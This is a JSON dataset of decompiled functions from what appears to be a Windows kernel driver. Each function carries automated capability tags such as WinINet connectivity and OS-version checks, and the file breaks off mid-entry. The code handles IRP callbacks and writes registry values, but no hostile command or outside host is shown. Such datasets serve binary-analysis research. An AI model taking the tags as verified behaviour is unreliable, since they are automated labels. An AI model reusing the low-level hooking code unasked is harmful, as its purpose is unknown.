{
    "00015a50": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00015a50(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    uint *arg_8h_00;\n    uint var_e0h;\n    int32_t var_84h;\n    uint var_80h;\n    int32_t var_28h;\n    uint var_24h;\n    \n    iVar1 = fcn.000533b0(0x800cdc28, 1, 0);\n    if (iVar1 != 1) {\n        fcn.0001d850();\n        fcn.00034fd0(0x800ce3e8, 0x104);\n        var_84h = fcn.0001eb90();\n        uVar2 = fcn.0003fc00();\n        var_84h = fcn.000326f0(uVar2 & 0xffffff00 | arg_8h & 0xff);\n        if (var_84h == 0) {\n            fcn.000789a2(*(*0x800cc770 + 0x1c), 0);\n        }\n        *0x800dba24 = *(*0x800cc770 + 4);\n        *0x800dbb2c = 0x8005ddb0;\n        *0x800dbb40 = 1;\n        *0x800dbb44 = *0x800cc770;\n        *0x800dba28 = *0x80051338;\n        *0x800dba2c = *0x8005133c;\n        var_28h = (-(arg_8h != 0) & 0xffffff8b) + 0x78;\n        var_84h = -1;\n        fcn.0002c390(&fcn.00015a50::var_80h, 0x52);\n        fcn.0002c3c0(&fcn.00015a50::var_e0h, 0x52);\n        do {\n            iVar1 = fcn.00036130(&fcn.00015a50::var_80h, &fcn.00015a50::var_24h);\n            if (iVar1 == 0) {\n                arg_8h_00 = &fcn.00015a50::var_e0h;\n                var_84h = fcn.00024160(arg_8h_00, 0);\n                if (var_84h == 0) break;\n            }\n            arg_8h_00 = 0x15b76;\n            fcn.00043cb0(1000);\n            iVar1 = var_28h + -1;\n            bVar3 = var_28h != 0;\n            var_28h = iVar1;\n        } while (bVar3);\n        fcn.0006c300(arg_8h_00);\n        var_84h = fcn.0001dbb0();\n        fcn.00056e40();\n        fcn.000192b0();\n        fcn.0001e1c0();\n        fcn.00043cf0();\n        fcn.0004b9b0();\n    }\n    return 0;\n}\n",
        "token_count": 704
    },
    "00015bc0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.00015bc0(void)\n\n{\n    if (*0x800cdc28 != 0) {\n        fcn.0004ba50();\n        fcn.00044070(0);\n        fcn.00019310();\n        fcn.00057010();\n        fcn.0003fc90();\n        fcn.0001dc40();\n        fcn.0006c390();\n        fcn.00024750();\n        fcn.00032bc0();\n        fcn.0001ef10();\n    }\n    return;\n}\n",
        "token_count": 119
    },
    "00015c10": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00015c10(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint *var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_24h._0_2_ = 0xa8;\n    var_24h._2_2_ = 0xaa;\n    var_20h = 0x80051340;\n    var_8h._0_2_ = 0x20;\n    var_8h._2_2_ = 0x22;\n    var_4h = 0x800513ec;\n    var_2ch = 0xffffffff;\n    var_48h = fcn.0001b7b0();\n    if (var_48h == 0) {\n        var_18h = *(*0x800cc770 + 4);\n        var_14h = *(*0x800cc770 + 8);\n        var_10h = *(*0x800cc770 + 0xc);\n        var_ch = *(*0x800cc770 + 0x10);\n        var_48h = fcn.000634e0(&var_18h);\n        if (var_48h == 0) {\n            fcn.0001d640();\n            if (arg_ch != '\\0') {\n                fcn.00016710(arg_8h);\n            }\n            var_44h = 0x18;\n            var_40h = 0;\n            var_38h = 0x40;\n            var_3ch = &var_24h;\n            var_34h = 0;\n            var_30h = 0;\n            iVar1 = fcn.000789ba(&var_1ch, 2, &var_44h);\n            if (iVar1 == 0) {\n                fcn.000789ae(var_1ch, &var_8h, 0, 4, &var_2ch, 4);\n                fcn.000789b4(var_1ch);\n            }\n            var_48h = fcn.00015f70();\n            if (((var_48h == 0) && (var_48h = fcn.0005cd70(*(*0x800cc770 + 0xc), 0x80051410, &var_28h),  var_48h == 0))\n               && (var_48h = fcn.000636c0(var_28h, 0x80055dd0, 0x800cdc2c),  var_48h == 0)) {\n                fcn.00063fd0(*0x800cdc2c);\n            }\n        }\n    }\n    if (var_48h != 0) {\n        fcn.00015d90();\n    }\n    return var_48h;\n}\n",
        "token_count": 741
    },
    "00015dd0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.00015dd0(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint32_t arg_20h, \n            uint arg_24h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t extraout_ECX;\n    uint32_t uVar3;\n    uint var_18h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int16_t *var_4h;\n    \n    var_10h = fcn.00035150();\n    uVar3 = extraout_ECX & 0xffffff00 | arg_20h & 0xff;\n    iVar2 = arg_ch;\n    pcVar1 = fcn.00063f30(arg_8h);\n    var_8h = (*pcVar1)(arg_8h, iVar2, arg_10h, arg_14h, arg_18h, arg_1ch, uVar3, arg_24h);\n    if (((var_8h == 0) && (arg_ch != 0)) && (*(arg_ch + 0x20) != 0)) {\n        uVar3 = *(arg_ch + 0x1c) >> 1;\n        for (var_4h = *(arg_ch + 0x20) + -2 + uVar3 * 2; (*var_4h != 0x5c && (*(arg_ch + 0x20) <= var_4h));\n            var_4h = var_4h + -1) {\n        }\n        var_4h = var_4h + 1;\n        var_ch = uVar3 - (var_4h - *(arg_ch + 0x20) >> 1);\n        iVar2 = fcn.000789a8(var_4h, 0x80051420, var_ch);\n        if ((iVar2 == 0) || (iVar2 = fcn.000789a8(var_4h, 0x8005142c, var_ch),  iVar2 == 0)) {\n            if (var_10h < 0x1b) {\n                fcn.000533d0(0);\n            }\n        }\n        else {\n            iVar2 = fcn.000789a8(var_4h, 0x80051434, var_ch);\n            if (((((iVar2 == 0) || (iVar2 = fcn.000789a8(var_4h, 0x80051440, var_ch),  iVar2 == 0)) ||\n                 (iVar2 = fcn.000789a8(var_4h, 0x8005144c, var_ch),  iVar2 == 0)) ||\n                (iVar2 = fcn.000789a8(var_4h, 0x80051458, var_ch),  iVar2 == 0)) &&\n               (iVar2 = fcn.0001ace0(&var_18h, 0x8005d220, 0),  iVar2 == 0)) {\n                fcn.00037760(&var_18h, 0);\n                fcn.00037710(&var_18h);\n            }\n        }\n    }\n    return var_8h;\n}\n",
        "token_count": 741
    },
    "00015f70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.00015f70(void)\n\n{\n    int32_t var_8h;\n    uint var_4h;\n    \n    fcn.00037440(0x800cdc30);\n    var_8h = fcn.0005cd70(*(*0x800cc770 + 0xc), 0x8005146c, &var_4h);\n    if ((var_8h == 0) && (var_8h = fcn.000636c0(var_4h, 0x80056540, 0x800cdc40),  var_8h == 0)) {\n        fcn.00063fd0(*0x800cdc40);\n    }\n    return var_8h;\n}\n",
        "token_count": 163
    },
    "00016020": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00016020(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar1 = fcn.000356f0(0x14);\n    if (puVar1 == NULL) {\n        uVar2 = 0xc000009a;\n    }\n    else {\n        puVar1[1] = arg_8h;\n        puVar1[2] = arg_ch;\n        puVar1[3] = arg_10h;\n        *(puVar1 + 4) = arg_14h;\n        *(puVar1 + 0x11) = arg_18h;\n        fcn.00037640(0x800cdc30, &var_4h, 1);\n        *puVar1 = *0x800cdc3c;\n        *0x800cdc3c = puVar1;\n        fcn.00037670(0x800cdc30, &var_4h, 1);\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 270
    },
    "000160b0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000160b0(int32_t arg_8h)\n\n{\n    int32_t **var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    fcn.00037640(0x800cdc30, &var_8h, 1);\n    var_ch = 0x800cdc3c;\n    do {\n        if (*var_ch == NULL) {\ncode_r0x00016110:\n            fcn.00037670(0x800cdc30, &var_8h, 1);\n            return;\n        }\n        if ((*var_ch)[1] == arg_8h) {\n            var_4h = *var_ch;\n            *var_ch = **var_ch;\n            fcn.000357f0(var_4h);\n            goto code_r0x00016110;\n        }\n        var_ch = *var_ch;\n    } while( true );\n}\n",
        "token_count": 203
    },
    "00016130": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00016130(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t **var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    fcn.00037640(0x800cdc30, &var_8h, 1);\n    var_ch = 0x800cdc3c;\n    do {\n        if (*var_ch == NULL) {\ncode_r0x000161cc:\n            fcn.00037670(0x800cdc30, &var_8h, 1);\n            return;\n        }\n        if (((((*var_ch)[1] == arg_8h) && ((*var_ch)[2] == arg_ch)) && ((*var_ch)[3] == arg_10h)) &&\n           ((*(*var_ch + 4) == arg_14h && (*(*var_ch + 0x11) == arg_18h)))) {\n            var_4h = *var_ch;\n            *var_ch = **var_ch;\n            fcn.000357f0(var_4h);\n            goto code_r0x000161cc;\n        }\n        var_ch = *var_ch;\n    } while( true );\n}\n",
        "token_count": 285
    },
    "000161f0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000161f0(uint arg_8h, uint arg_ch)\n\n{\n    uint var_10h;\n    int32_t var_8h;\n    uint var_4h;\n    \n    fcn.000789c0(&var_10h, arg_8h);\n    var_8h = (**0x800512ec)(&var_10h, 0, &var_4h, arg_ch);\n    if (var_8h == 0) {\n        (**0x800512e4)();\n        (**0x800512e0)();\n    }\n    return var_8h;\n}\n",
        "token_count": 138
    },
    "00016240": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00016240(uint arg_8h, int32_t arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    uchar *puVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    puVar1 = *(arg_ch + 0x60);\n    if (arg_10h == 0) {\n        uVar2 = 0;\n    }\n    else {\n        puVar3 = fcn.000356f0(0x2c);\n        if (puVar3 == NULL) {\n            *(arg_ch + 0x18) = 0xc000009a;\n            (**0x800512e8)();\n            uVar2 = 0xc000009a;\n        }\n        else {\n            *puVar3 = *(puVar1 + 0x1c);\n            puVar3[1] = *(puVar1 + 0x20);\n            puVar3[2] = arg_10h;\n            puVar3[3] = arg_14h;\n            puVar3[4] = *(puVar1 + 0x18);\n            puVar3[5] = arg_8h;\n            *(puVar3 + 6) = puVar1[3];\n            *(puVar3 + 0x1a) = *puVar1;\n            *(puVar3 + 0x1b) = puVar1[1];\n            *(puVar3 + 0x19) = puVar1[2];\n            puVar3[7] = *(puVar1 + 4);\n            puVar3[8] = *(puVar1 + 8);\n            puVar3[9] = *(puVar1 + 0xc);\n            puVar3[10] = *(puVar1 + 0x10);\n            *(puVar1 + 0x1c) = 0x80056340;\n            *(puVar1 + 0x20) = puVar3;\n            puVar1[3] = 0xe0;\n            uVar2 = 0;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 481
    },
    "00016340": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00016340(uint arg_8h, int32_t arg_ch, code **arg_10h)\n\n{\n    uchar *puVar1;\n    uint uVar2;\n    bool bVar3;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *(arg_ch + 0x23) = *(arg_ch + 0x23) + -1;\n    *(arg_ch + 0x60) = *(arg_ch + 0x60) + -0x24;\n    puVar1 = *(arg_ch + 0x60);\n    uVar2 = *(puVar1 + 0x14);\n    if (arg_10h[2] == NULL) {\n        var_ch = 0;\n    }\n    else {\n        *(puVar1 + 0x18) = arg_10h[4];\n        *(puVar1 + 0x14) = arg_10h[5];\n        *puVar1 = *(arg_10h + 0x1a);\n        puVar1[1] = *(arg_10h + 0x1b);\n        puVar1[2] = *(arg_10h + 0x19);\n        *(puVar1 + 4) = arg_10h[7];\n        *(puVar1 + 8) = arg_10h[8];\n        *(puVar1 + 0xc) = arg_10h[9];\n        *(puVar1 + 0x10) = arg_10h[10];\n        puVar1[3] = *(arg_10h + 6);\n        *(puVar1 + 0x1c) = *arg_10h;\n        *(puVar1 + 0x20) = arg_10h[1];\n        var_ch = (*arg_10h[2])(arg_10h[5], arg_ch, arg_10h[3]);\n        if (var_ch == -0x3fffffea) {\n            return -0x3fffffea;\n        }\n    }\n    *(puVar1 + 0x1c) = *arg_10h;\n    *(puVar1 + 0x20) = arg_10h[1];\n    *(puVar1 + 0x14) = uVar2;\n    *(arg_ch + 0x23) = *(arg_ch + 0x23) + '\\x01';\n    *(arg_ch + 0x60) = *(arg_ch + 0x60) + 0x24;\n    if (*arg_10h != NULL) {\n        bVar3 = false;\n        if (*(arg_ch + 0x24) == '\\0') {\n            if (*(arg_ch + 0x18) < 0) {\n                if ((*(arg_10h + 6) & 0x80) != 0) {\n                    bVar3 = true;\n                }\n            }\n            else {\n                bVar3 = (*(arg_10h + 6) & 0x40) != 0;\n            }\n        }\n        else {\n            bVar3 = (*(arg_10h + 6) & 0x20) != 0;\n        }\n        if (bVar3) {\n            var_ch = (**arg_10h)(uVar2, arg_ch, arg_10h[1]);\n        }\n    }\n    fcn.000357f0(arg_10h);\n    return var_ch;\n}\n",
        "token_count": 759
    },
    "00016540": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00016540(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_1dh;\n    char *var_18h;\n    uint *var_14h;\n    code *var_10h;\n    code *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = NULL;\n    var_10h = NULL;\n    var_1dh._0_1_ = '\\x01';\n    stack0xffffffe0 = 0;\n    if ((in_ECX == 0) || (in_EDX == 0)) {\n        pcVar1 = fcn.00063f30(arg_8h);\n        var_8h = (*pcVar1)();\n    }\n    else {\n        *(in_EDX + 0x23) = *(in_EDX + 0x23) + -1;\n        *(in_EDX + 0x60) = *(in_EDX + 0x60) + -0x24;\n        var_24h = in_ECX;\n        if (((*(in_EDX + 0x23) <= *(in_EDX + 0x22)) && ('\\0' < *(in_EDX + 0x23))) &&\n           (var_18h = *(in_EDX + 0x60),  var_18h != NULL)) {\n            *(var_18h + 0x14) = in_ECX;\n            fcn.000332c0(&var_24h);\n            *(var_18h + 0x14) = var_24h;\n            fcn.00037640(0x800cdc30, &var_4h, 0);\n            for (var_14h = *0x800cdc3c; var_14h != NULL; var_14h = *var_14h) {\n                if (((var_14h[1] == 0) || (var_14h[1] == var_24h)) &&\n                   ((*(var_14h + 4) == '\\0' || ((*(var_14h + 4) == *var_18h && (*(var_14h + 0x11) == var_18h[1])))))) {\n                    var_ch = var_14h[2];\n                    var_10h = var_14h[3];\n                    break;\n                }\n            }\n            fcn.00037670(0x800cdc30, &var_4h, 0);\n            if ((var_ch != NULL) && (var_8h = (*var_ch)(var_24h, in_EDX, &var_1dh, &var_1dh + 1),  var_1dh == '\\0')) {\n                return var_8h;\n            }\n        }\n        *(in_EDX + 0x23) = *(in_EDX + 0x23) + '\\x01';\n        *(in_EDX + 0x60) = *(in_EDX + 0x60) + 0x24;\n        pcVar1 = fcn.00063f30(arg_8h);\n        var_8h = (*pcVar1)();\n        if (var_10h != NULL) {\n            var_8h = (*var_10h)(var_24h, in_EDX, var_8h, stack0xffffffe0);\n        }\n    }\n    return var_8h;\n}\n",
        "token_count": 787
    },
    "00016710": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00016710(int16_t *param_1)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint var_18h;\n    int16_t *var_8h;\n    uint var_73ch;\n    uint var_734h;\n    uint *var_730h;\n    uint var_72ch;\n    uint var_724h;\n    uint *var_720h;\n    uint var_718h;\n    uint var_512h;\n    uint var_50ch;\n    uint var_508h;\n    uint var_500h;\n    uint var_4fch;\n    uint32_t var_4f8h;\n    uint var_4f4h;\n    uint var_4f0h;\n    int32_t var_4ech;\n    uint var_4e8h;\n    uint var_4e4h;\n    int32_t var_4e0h;\n    uint var_4dch;\n    uint var_4d8h;\n    uint var_4d4h;\n    uint var_4d0h;\n    uint var_4cch;\n    uint var_4c8h;\n    uint var_4c4h;\n    uint var_4c0h;\n    ushort var_2bah;\n    uint var_2b8h;\n    uint var_2b4h;\n    uint var_2b0h;\n    uint var_aah;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    int32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uchar *puStack28;\n    uint var_10h;\n    uint uStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x800b8d30;\n    uStack16 = 0x800b8bf4;\n    var_10h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_10h;\n    puStack28 = &stack0xfffff8b4;\n    var_4f4h._0_2_ = 8;\n    var_4f4h._2_2_ = 10;\n    var_4f0h = 0x8005147c;\n    var_4d0h._0_2_ = 10;\n    var_4d0h._2_2_ = 0xc;\n    var_4cch = 0x80051488;\n    var_2b8h._0_2_ = 0x18;\n    var_2b8h._2_2_ = 0x1a;\n    var_2b4h = 0x80051494;\n    var_500h._0_2_ = 10;\n    var_500h._2_2_ = 0xc;\n    var_4fch = 0x800514b0;\n    var_20h._0_2_ = 0x12;\n    var_20h._2_2_ = 0x14;\n    var_1ch = 0x800514bc;\n    var_4c8h._0_2_ = 0x14;\n    var_4c8h._2_2_ = 0x16;\n    var_4c4h = 0x800514d0;\n    var_98h._0_2_ = 10;\n    var_98h._2_2_ = 0xc;\n    var_94h = 0x800514e8;\n    fcn.0002c180(&var_90h, 100);\n    fcn.000789c6(&var_2b0h, 0x104, 0x800514f4, &var_90h);\n    var_aah._0_2_ = 0;\n    fcn.0002c1b0(&var_90h, 100);\n    fcn.000789c6(&var_4c0h, 0x104, 0x80051514, &var_2b0h, &var_90h);\n    var_2bah = 0;\n    fcn.000789c0(&var_aah + 2, &var_2b0h);\n    var_4e8h = 0x18;\n    var_4e4h = 0;\n    var_4dch = 0x40;\n    var_4e0h = &var_aah + 2;\n    var_4d8h = 0;\n    var_4d4h = 0;\n    var_4ech = fcn.0001f080(&var_50ch, 0xc0000000, &var_4e8h, &var_508h, 0, 2, 0, 2, 0x21, 0, 0);\n    if (var_4ech == 0) {\n        fcn.000789b4(var_50ch);\n    }\n    if ((*var_8h == 0) && (*(var_8h + 10) != 0)) {\n        var_4h = 0;\n        (**0x800512dc)(*(var_8h + 10), 8, 1);\n        var_a0h = **(var_8h + 10);\n        var_9ch = (*(var_8h + 10))[1];\n        (**0x800512dc)(var_a0h, var_9ch, 1);\n        fcn.000789c0();\n        var_4e8h = 0x18;\n        var_4e4h = 0;\n        var_4dch = 0x40;\n        var_4e0h = &var_aah + 2;\n        var_4d8h = 0;\n        var_4d4h = 0;\n        var_4ech = fcn.0001f080(&var_50ch, 0x40000000, &var_4e8h, &var_508h, 0, 0x80, 0, 2, 0x60, 0, 0);\n        if (var_4ech == 0) {\n            var_4ech = fcn.000789e4(var_50ch, 0, 0, 0, &var_508h, var_a0h, var_9ch, 0, 0);\n            fcn.000789b4(var_50ch);\n        }\n        var_4h = 0xffffffff;\n    }\n    iVar2 = fcn.00035150();\n    var_4f8h = 0x25 < iVar2;\n    fcn.0002c0f0(&var_90h, 100);\n    fcn.000789c6(&var_718h, 0x104, 0x80051520, &var_90h);\n    fcn.000789c0(&var_aah + 2, &var_718h);\n    var_4e8h = 0x18;\n    var_4e4h = 0;\n    var_4dch = 0x40;\n    var_4e0h = &var_aah + 2;\n    var_4d8h = 0;\n    var_4d4h = 0;\n    var_4ech = fcn.0001d470(&var_50ch, 0x40000000, &var_4e8h, 0, 0, 0, 0);\n    if (var_4ech == 0) {\n        var_24h = 0;\n        fcn.0001d4f0(var_50ch, &var_2b8h, 0, 4, &var_24h, 4);\n        var_24h = (-(var_4f8h != 0) & 0xf) + 1;\n        fcn.0001d4f0(var_50ch, &var_4f4h, 0, 4, &var_24h, 4);\n        if (var_4f8h == 0) {\n            var_24h = 1;\n        }\n        else {\n            var_24h = 2;\n        }\n        fcn.0001d4f0(var_50ch, &var_4d0h, 0, 4, &var_24h, 4);\n        if (var_4f8h == 0) {\n            fcn.0001d4f0(var_50ch, &var_500h, 0, 1, 0x80051590, 0x20);\n        }\n        if (var_4f8h == 0) {\n            var_730h = &var_4c0h;\n            do {\n                iVar1 = *var_730h;\n                var_730h = var_730h + 2;\n            } while (iVar1 != 0);\n            fcn.0001d4f0(var_50ch, &var_20h, 0, 1, &var_4c0h, (var_730h - (&var_4c0h + 2) >> 1) * 2 + 2);\n        }\n        else {\n            fcn.0002c1e0(&var_90h, 100);\n            fcn.000789c6(&var_718h, 0x104, 0x80051514, &var_2b0h, &var_90h);\n            var_512h._0_2_ = 0;\n            var_720h = &var_718h;\n            do {\n                iVar1 = *var_720h;\n                var_720h = var_720h + 2;\n            } while (iVar1 != 0);\n            fcn.0001d4f0(var_50ch, &var_20h, 0, 2, &var_718h, (var_720h - (&var_718h + 2) >> 1) * 2 + 2);\n        }\n        if (var_4f8h != 0) {\n            fcn.0001d4f0(var_50ch, &var_4c8h, 0, 1, 0x800515b0, 0x18);\n            var_24h = 1;\n            fcn.0001d4f0(var_50ch, &var_98h, 0, 4, &var_24h, 4);\n        }\n        fcn.000789d2(var_50ch);\n        fcn.000789b4(var_50ch);\n    }\n    *in_FS_OFFSET = var_10h;\n    return;\n}\n",
        "token_count": 2436
    },
    "00016d90": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00016d90(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_2b8h;\n    uint var_b0h;\n    uint var_ach;\n    int32_t var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint *var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uchar var_85h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_68h;\n    \n    var_84h._0_2_ = 8;\n    var_84h._2_2_ = 10;\n    var_80h = 0x800515c8;\n    var_78h._0_2_ = 0x68;\n    var_78h._2_2_ = 0x6a;\n    var_74h = 0x800515d8;\n    fcn.0002c180(&var_68h, 100);\n    fcn.000789c6(&var_2b8h, 0x104, 0x800514f4, &var_68h);\n    fcn.000789c0(&var_70h, &var_2b8h);\n    var_a0h = 0x18;\n    var_9ch = 0;\n    var_94h = 0x40;\n    var_98h = &var_70h;\n    var_90h = 0;\n    var_8ch = 0;\n    iVar1 = fcn.000789de(&var_b0h, 0x10000000, &var_a0h, &var_ach, 0, 0);\n    if (iVar1 == 0) {\n        if (arg_8h != '\\0') {\n            fcn.0002c150(&var_68h, 100);\n            fcn.000789c6(&var_2b8h, 0x104, 0x80051644, &var_68h);\n            fcn.000789c0(&var_70h, &var_2b8h);\n            var_a0h = 0x18;\n            var_9ch = var_b0h;\n            var_94h = 0x40;\n            var_98h = &var_70h;\n            var_90h = 0;\n            var_8ch = 0;\n            fcn.000789d8(&var_a0h);\n        }\n        fcn.0002c1b0(&var_68h, 100);\n        fcn.000789c6(&var_2b8h, 0x104, 0x80051644, &var_68h);\n        fcn.000789c0(&var_70h, &var_2b8h);\n        var_a0h = 0x18;\n        var_9ch = var_b0h;\n        var_94h = 0x40;\n        var_98h = &var_70h;\n        var_90h = 0;\n        var_8ch = 0;\n        fcn.000789d8(&var_a0h);\n        if (arg_8h != '\\0') {\n            var_85h = 1;\n            fcn.000789cc(var_b0h, &var_ach, &var_85h, 1, 0xd);\n        }\n        fcn.000789b4(var_b0h);\n    }\n    fcn.0002c0f0(&var_68h, 100);\n    fcn.000789c6(&var_2b8h, 0x104, 0x80051520, &var_68h);\n    fcn.000789c0(&var_70h, &var_2b8h);\n    var_a0h = 0x18;\n    var_9ch = 0;\n    var_94h = 0x40;\n    var_98h = &var_70h;\n    var_90h = 0;\n    var_8ch = 0;\n    var_a4h = fcn.000789ba(&var_b0h, 0x10000000, &var_a0h);\n    if (var_a4h == 0) {\n        var_a0h = 0x18;\n        var_9ch = var_b0h;\n        var_94h = 0x40;\n        var_98h = &var_84h;\n        var_90h = 0;\n        var_8ch = 0;\n        var_a4h = fcn.000789ba(&var_7ch, 0x10000000, &var_a0h);\n        if (var_a4h == 0) {\n            fcn.000789ea(var_7ch);\n            fcn.000789b4(var_7ch);\n        }\n        fcn.000789ea(var_b0h);\n        fcn.000789b4(var_b0h);\n    }\n    var_a0h = 0x18;\n    var_9ch = 0;\n    var_94h = 0x40;\n    var_98h = &var_78h;\n    var_90h = 0;\n    var_8ch = 0;\n    var_a4h = fcn.000789ba(&var_b0h, 0x10000000, &var_a0h);\n    if (var_a4h == 0) {\n        fcn.000789d2(var_b0h);\n        fcn.000789b4(var_b0h);\n    }\n    return;\n}\n",
        "token_count": 1299
    },
    "00017160": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
